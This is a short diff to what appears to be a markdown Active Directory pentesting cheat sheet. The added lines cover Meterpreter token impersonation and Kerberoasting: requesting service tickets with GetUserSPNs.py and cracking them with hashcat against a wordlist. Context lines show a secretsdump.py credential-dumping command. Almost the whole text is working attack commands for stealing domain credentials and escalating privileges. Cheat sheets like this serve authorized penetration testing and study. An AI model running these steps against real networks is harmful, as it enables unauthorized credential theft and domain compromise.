@@ -308,7 +308,21 @@ secretsdump.py <domain>/<user>:<password>@<IP>
 ```
 
 ### Token Impersonation
+#### from meterpreter session
+  1. load incognito
+  2. list_token -u
+  3. impersonate_token <user>
+
 ### kerberoasting
+  1. Use GetUserSPNs.py
+  ```sh
+  GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc_ip> -request
+  ```
+  2. Crack the hash
+  ```powershell
+  .\hashcat -m 13100 .\ntlmhash.txt .\rockyou.txt -O
+  ```
+
 ### Abusing GPP
 
 ## ZeroLogon
